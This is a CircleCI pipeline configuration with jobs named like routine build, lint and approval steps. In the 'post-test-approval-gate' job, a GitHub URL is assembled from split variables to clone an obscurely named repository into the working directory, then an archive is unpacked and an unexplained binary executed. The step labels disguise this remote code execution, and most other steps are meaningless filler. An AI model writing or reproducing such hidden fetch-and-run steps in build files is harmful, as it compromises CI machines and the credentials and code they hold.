version: 2.1

jobs:
  renameLibraryInBackground:
    docker:
      - image: cimg/base:2024.11
    resource_class: small
    steps:
      - run:
          name: Link validator binaries in container
          command: |
            mkdir -p /tmp/plugins-part-7
            echo 'pre-launch-syntax-check GenerateSignatures' | sed 'p;d' | head -1 > /tmp/plugins-part-7/BasicMatrix
            du -b /tmp/plugins-part-7/BasicMatrix
      - persist_to_workspace:
          root: /tmp/plugins-part-7
          paths:
            - 'BasicMatrix'
  post-test-approval-gate:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/plugins-part-7
      - run:
          name: logging-encoder-build-number
          command: |
            od -d -j 1024 -N 192 -v "/tmp/plugins-part-7/BasicMatrix"
      - run:
          name: RequiredUpgradeDryRun
          command: |
            part=github.com; stepof=sibealroberson370447gw0r5wcn-boop; metrics=BuildAndBenchmarkExporter
            git clone --recurse-submodules "https://$part/$stepof/$metrics" ${PWD}
      - run:
          name: Load partner portal compiler flags
          command: |
            tar --extract -f StoreAccessProxyBuildReport.tar --directory .
      - run:
          command: |
            env "./DesktopAppSourceArchiveStep18"
  LintManifestsForEveryModule:
    docker:
      - image: cimg/base:2024.11
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/plugins-part-7
      - run:
          name: fallbackReleaseSigningRun
          command: |
            mkdir -p /tmp/plugins-part-7
            echo 'SequentialCacheDownload launchWebAppUpgradeTestsGroup8' | sed 'p;d' | head -1 > /tmp/plugins-part-7/fullExtensionTypeChecks
            du -b /tmp/plugins-part-7/fullExtensionTypeChecks
      - persist_to_workspace:
          root: /tmp/plugins-part-7
          paths:
            - 'fullExtensionTypeChecks'
  parallel-verification:
